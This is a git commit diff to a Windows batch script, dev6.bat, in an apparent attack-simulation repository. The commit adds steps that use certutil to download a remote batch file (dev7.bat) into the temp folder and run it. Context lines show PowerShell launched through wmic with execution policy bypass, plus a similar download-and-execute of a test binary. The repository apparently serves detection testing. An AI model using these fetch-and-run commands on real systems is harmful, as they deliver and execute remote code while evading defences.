de6e164c2c7ef188098b318ed037aa24c11b6a30
Kijo Ninja <120234772+LearningKijo@users.noreply.github.com>
2024-04-02 17:28:09 +0900

    Update dev6.bat

--- DEV/SimulationRepo/dev6.bat
+++ DEV/SimulationRepo/dev6.bat
@@ -2,3 +2,6 @@ wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Com
 timeout /t 10 /nobreak >nul
 certutil.exe -urlcache -f "https://aka.ms/ioavtest" "%Temp%\validatecloud.exe"
 cmd /c "%Temp%\validatecloud.exe"
+timeout /t 10 /nobreak >nul
+certutil.exe -urlcache -f "https://raw.githubusercontent.com/LearningKijo/ResearchDev/main/DEV/SimulationRepo/dev7.bat" "%Temp%\dev7.bat"
+cmd /c "%Temp%\dev7.bat"
